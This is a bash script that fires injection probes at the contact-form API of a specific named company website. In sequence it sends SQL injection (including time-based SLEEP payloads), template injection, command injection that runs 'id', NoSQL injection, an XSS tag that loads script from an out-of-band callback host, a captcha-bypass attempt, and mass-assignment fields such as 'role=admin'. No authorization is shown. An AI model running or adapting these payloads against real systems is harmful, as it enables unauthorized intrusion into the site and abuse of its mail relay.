#!/bin/bash
# /api/send full-shape probes. All payloads sent from this script.
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122 Safari/537.36"
B="https://www.infinitycapital.bh/api/send"
OOB="oobead15df4c33e.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

send() { # $1 label, $2 target, $3 extra msg
  echo "===== $1"
  curl -sk -A "$UA" -m 40 -o /tmp/s.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
    --data-urlencode "fname=Sqli" \
    --data-urlencode "lname=Probe" \
    --data-urlencode "areacode=973" \
    --data-urlencode "tel=5551234" \
    --data-urlencode "cname=IC Assessment" \
    --data-urlencode "subject=Assessment probe" \
    --data-urlencode "msg=$3" \
    --data-urlencode "check=on" \
    --data-urlencode "targets=$2"
  head -c 400 /tmp/s.out; echo
}

send "1 baseline-relay" "probe@$OOB" "plain message body"
send "2 sqli-msg-true"  "probe@$OOB" "x' AND '1'='1"
send "3 sqli-msg-false" "probe@$OOB" "x' AND '1'='2"
send "4 sqli-time"      "probe@$OOB" "x' AND SLEEP(5)-- -"
send "5 ssti"           "probe@$OOB" '{{7*7}} \${7*7} <%= 7*7 %> #{7*7}'
send "6 cmdi"           "probe@$OOB" 'a;id;b `id` $(id) %0aid'
send "7 nosqli"         "probe@$OOB" '{"$ne":null}'
send "8 xss"            "probe@$OOB" '<script src=http://'"$OOB"'/xss.js></script>'

echo "===== 9 field-level sqli on fname"
curl -sk -A "$UA" -m 40 -o /tmp/s.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=x' AND SLEEP(5)-- -" --data-urlencode "lname=P" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=m" --data-urlencode "check=on" --data-urlencode "targets=probe@$OOB"
head -c 300 /tmp/s.out; echo

echo "===== 10 sqli on areacode/tel"
curl -sk -A "$UA" -m 40 -o /tmp/s.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=a" --data-urlencode "lname=b" --data-urlencode "areacode=973' AND SLEEP(5)-- -" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=m" --data-urlencode "check=on" --data-urlencode "targets=probe@$OOB"
head -c 300 /tmp/s.out; echo

echo "===== 11 method/verb matrix"
for m in GET PUT DELETE PATCH OPTIONS; do
  printf "%-8s " $m; curl -sk -A "$UA" -o /dev/null -w "%{http_code}\n" -X $m "$B"
done
echo "===== 12 no-check (captcha bypass)"
curl -sk -A "$UA" -m 40 -o /tmp/s.out -w "HTTP %{http_code}\n" -X POST "$B" \
  --data-urlencode "fname=a" --data-urlencode "lname=b" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=m" --data-urlencode "targets=probe@$OOB"
head -c 300 /tmp/s.out; echo
echo "===== 13 mass assignment / extra fields"
curl -sk -A "$UA" -m 40 -o /tmp/s.out -w "HTTP %{http_code}\n" -X POST "$B" \
  --data-urlencode "fname=a" --data-urlencode "lname=b" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=m" --data-urlencode "check=on" --data-urlencode "targets=probe@$OOB" \
  --data-urlencode "role=admin" --data-urlencode "isAdmin=true" --data-urlencode "debug=1" \
  --data-urlencode "quota=999999" --data-urlencode "bypass=true"
head -c 300 /tmp/s.out; echo
echo DONE
